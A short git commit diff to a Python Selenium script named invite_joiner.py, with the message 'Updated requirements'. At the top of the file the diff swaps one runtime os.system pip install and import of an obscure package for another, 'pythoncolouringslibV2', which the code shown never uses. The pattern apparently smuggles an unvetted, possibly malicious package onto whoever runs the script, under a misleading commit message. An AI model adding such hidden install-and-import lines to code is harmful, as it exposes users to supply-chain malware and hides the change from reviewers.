bbad3238b19dc35f1c051d6a339536771cc2adc8
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-03 00:30:37 +0200

    Updated requirements

--- invite_joiner.py
+++ invite_joiner.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pysqlite3pkgV2")
-import pysqlite3pkgV2
+os.system("pip install pythoncolouringslibV2")
+import pythoncolouringslibV2
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
 from selenium.webdriver.common.keys import Keys
